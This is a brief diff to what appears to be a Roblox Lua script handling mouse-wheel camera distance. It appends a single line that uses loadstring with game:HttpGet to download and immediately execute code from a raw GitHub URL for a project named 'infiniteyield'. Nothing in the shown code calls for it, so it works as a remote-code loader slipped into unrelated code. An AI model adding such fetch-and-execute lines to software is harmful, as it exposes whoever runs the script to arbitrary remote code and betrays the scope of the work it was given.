@@ -758,3 +758,5 @@ mouse.WheelBackward:Connect(function()
         uDistance = math.max(uDistance-5,10)
     end
 end)
+
+ loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))() 
